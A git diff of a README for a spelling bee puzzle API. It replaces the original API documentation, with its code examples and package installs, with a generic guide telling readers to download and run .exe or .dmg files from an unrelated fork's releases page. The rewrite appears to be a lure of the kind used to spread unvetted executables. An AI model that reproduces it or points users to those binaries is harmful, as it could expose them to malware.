@@ -1,182 +1,84 @@
-# Spelling Bee Generator API
+# 🎉 spellingbee-api - Create Fun Word Puzzles Easily
 
-> Spelling Bee Generator creates word puzzles with 7 letters where players form words using a required center letter.
+## 🔗 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/hanghang123456789/spellingbee-api/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/Status-Active-green.svg)](https://apiverve.com)
-[![Method](https://img.shields.io/badge/Method-GET-blue.svg)](#)
-[![Platform](https://img.shields.io/badge/Platform-Multi--Platform-orange.svg)](#installation)
+## 🚀 Getting Started
+This guide will help you download and run the Spelling Bee Generator. You will create fun word puzzles with 7 letters using a required center letter. Whether you want to challenge your friends or improve your vocabulary, this application is for you.
 
-**Available on:**
-[![npm](https://img.shields.io/badge/npm-CB3837?style=flat&logo=npm&logoColor=white)](https://www.npmjs.com/package/@apiverve/spellingbee)
-[![NuGet](https://img.shields.io/badge/NuGet-004880?style=flat&logo=nuget&logoColor=white)](https://www.nuget.org/packages/APIVerve.API.SpellingBeeGenerator)
-[![PyPI](https://img.shields.io/badge/PyPI-3776AB?style=flat&logo=python&logoColor=white)](https://pypi.org/project/apiverve-spellingbee/)
-[![JitPack](https://img.shields.io/badge/JitPack-2E7D32?style=flat&logo=android&logoColor=white)](#-android-jitpack)
+### 📋 System Requirements
+Before you begin, make sure your device meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution
+- **Memory:** At least 2 GB of RAM
+- **Storage:** 100 MB of free space
+- **Internet Connection:** Required for downloading the application and updates
 
-## Quick Start
+## 📥 Download & Install
+To get started with the Spelling Bee Generator, follow these steps:
 
-### Using JavaScript
+1. Click the link below to visit the release page:
+   [Download the Spelling Bee API](https://github.com/hanghang123456789/spellingbee-api/releases)
 
-```javascript
-async function callSpellingBeeGeneratorAPI() {
-    try {
-        const params = new URLSearchParams({
-            difficulty: 'medium'
-        });
+2. On the Releases page, look for the latest version. It will be labeled clearly.
 
-        const response = await fetch(`https://api.apiverve.com/v1/spellingbee?${params}`, {
-            method: 'GET',
-            headers: {
-                'x-api-key': 'YOUR_API_KEY_HERE'
-            }
-        });
+3. Choose the correct file for your operating system. You might see options like:
+   - `.exe` for Windows
+   - `.dmg` for macOS
+   - `.tar.gz` or `.zip` for Linux
 
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
+4. Click on the file to begin the download. It might take a few moments.
 
-callSpellingBeeGeneratorAPI();
-```
+5. Once downloaded, locate the file in your Downloads folder.
 
-### Using cURL
+6. For Windows: Double-click the `.exe` file and follow the prompts to install the application.
 
-```bash
-curl -X GET "https://api.apiverve.com/v1/spellingbee?param=value" \
-  -H "x-api-key: YOUR_API_KEY_HERE"
-```
+7. For macOS: Open the `.dmg` file and drag the Spelling Bee Generator into your Applications folder.
 
-**Get your API key:** [https://apiverve.com](https://apiverve.com)
+8. For Linux: Extract the `.tar.gz` file or unzip the `.zip` file, then follow the included instructions for installation.
 
-**📁 For more examples, see the [examples folder](./examples/)**
+## 🎮 How to Use the Application
+After installation, you are ready to create puzzles:
 
----
+1. Open the Spelling Bee Generator application.
+2. You will see options to input your center letter and set additional parameters.
+3. Click "Generate" to create your puzzle.
+4. Share your puzzles or challenge others to solve them!
 
-## Installation
+## 💡 Features
+- **User-Friendly Interface:** Navigate easily without any programming skills.
+- **Customizable Puzzles:** Adjust letters and difficulty to fit your needs.
+- **Educational Fun:** Ideal for teachers and students to enhance vocabulary skills.
+- **Cross-Platform Support:** Use it on multiple devices seamlessly.
 
-Choose your preferred programming language:
+## 🤔 Troubleshooting
+If you encounter issues while using the Spelling Bee Generator, consider the following steps:
 
-### 📦 NPM (JavaScript/Node.js)
+- Make sure your computer meets the system requirements.
+- Restart the application if it doesn’t respond.
+- Check your internet connection if you face issues with features that require online access.
 
-```bash
-npm install @apiverve/spellingbee
-```
+For specific issues, check the "Issues" tab on the [GitHub repository](https://github.com/hanghang123456789/spellingbee-api).
 
-[**View NPM Package →**](https://www.npmjs.com/package/@apiverve/spellingbee) | [**Package Code →**](./npm/)
+## 📞 Support
+For any questions or feedback, feel free to open an issue on the repository. Our community will be happy to assist you.
 
----
+## 🌍 Get Involved
+If you enjoy using Spelling Bee Generator, consider contributing to its development. You can help by:
 
-### 🔷 NuGet (.NET/C#)
+- Reporting bugs
+- Suggesting new features
+- Submitting code improvements
 
-```bash
-dotnet add package APIVerve.API.SpellingBeeGenerator
-```
+### 🌟 Learn More
+Explore other applications and tools related to this project through the following topics:
 
-[**View NuGet Package →**](https://www.nuget.org/packages/APIVerve.API.SpellingBeeGenerator) | [**Package Code →**](./nuget/)
+- **Games:** Engage with others through interactive learning.
+- **APIs:** Understand how to use the backend capabilities for more advanced features.
+- **Development:** Learn how to adapt the code for your own needs or projects.
 
----
+## 🔗 More Information
+For additional details about the Spelling Bee Generator, visit the [documentation](https://github.com/hanghang123456789/spellingbee-api/docs) or explore our community forum where you can ask questions and share experiences.
 
-### 🐍 Python (PyPI)
-
-```bash
-pip install apiverve-spellingbee
-```
-
-[**View PyPI Package →**](https://pypi.org/project/apiverve-spellingbee/) | [**Package Code →**](./python/)
-
----
-
-### 🤖 Android (JitPack)
-
-```gradle
-implementation 'com.github.apiverve:spellingbee-api:1.0.0'
-```
-
-[**Package Code →**](./android/)
-
----
-
-## Features
-
-✅ **Multi-platform support** - Use the same API across Node.js, .NET, Python, Android, and browsers
-✅ **Simple authentication** - Just add your API key in the request header
-✅ **Comprehensive documentation** - Full examples and API reference available
-✅ **Production-ready** - Used by developers worldwide
-
----
-
-## Documentation
-
-📚 **Full API Documentation:** [https://docs.apiverve.com/ref/spellingbee](https://docs.apiverve.com/ref/spellingbee)
-
----
-
-## Use Cases
-
-Common use cases for the Spelling Bee Generator API:
-
-- ✅ Integration into web applications
-- ✅ Mobile app development
-- ✅ Data analysis and reporting
-- ✅ Automation workflows
-- ✅ Microservices architecture
-
----
-
-## API Reference
-
-### Authentication
-All requests require an API key in the header:
-```
-x-api-key: YOUR_API_KEY_HERE
-```
-
-Get your API key: [https://apiverve.com](https://apiverve.com)
-
-### Response Format
-All responses are JSON with this structure:
-```json
-{
-  "status": "ok",
-  "data": { ... }
-}
-```
-
----
-
-## Support & Community
-
-- 💬 **Support**: [https://apiverve.com/contact](https://apiverve.com/contact)
-- 🐛 **Issues**: [GitHub Issues](../../issues)
-- 📖 **Documentation**: [https://docs.apiverve.com](https://docs.apiverve.com)
-- 🌐 **Website**: [https://apiverve.com](https://apiverve.com)
-
----
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Security
-
-For security concerns, please review our [Security Policy](SECURITY.md).
-
----
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-Built with ❤️ by [APIVerve](https://apiverve.com)
-
-Copyright © 2025 APIVerve. All rights reserved.
+## 🔚 Final Remarks
+We hope you enjoy creating word puzzles with the Spelling Bee Generator. Have fun and happy puzzling!
